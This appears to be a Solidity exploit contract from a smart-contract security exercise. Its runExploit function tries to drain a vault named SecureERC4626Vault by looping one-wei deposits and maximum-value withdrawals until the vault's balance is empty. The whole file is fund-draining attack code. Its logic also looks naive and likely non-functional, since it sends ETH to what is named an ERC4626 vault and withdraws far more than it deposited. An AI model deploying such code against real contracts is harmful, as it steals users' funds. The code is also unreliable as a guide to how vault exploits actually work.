// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {SecureERC4626Vault} from "../src/SecureERC4626Vault.sol";

contract ExploitModule {
    SecureERC4626Vault public targetContract;

    constructor(address _target) payable {
        targetContract = SecureERC4626Vault(payable(_target));
    }

    function runExploit() external payable {
        // Deposit a small amount of ETH into the vault
        targetContract.deposit{value: 1}();

        // Withdraw a large portion of the ETH back out
        targetContract.withdraw(type(uint256).max);

        // Repeat until the vault runs out of funds
        while (address(targetContract).balance > 0) {
            targetContract.deposit{value: 1}();
            targetContract.withdraw(type(uint256).max);
        }
    }

    receive() external payable {}
}
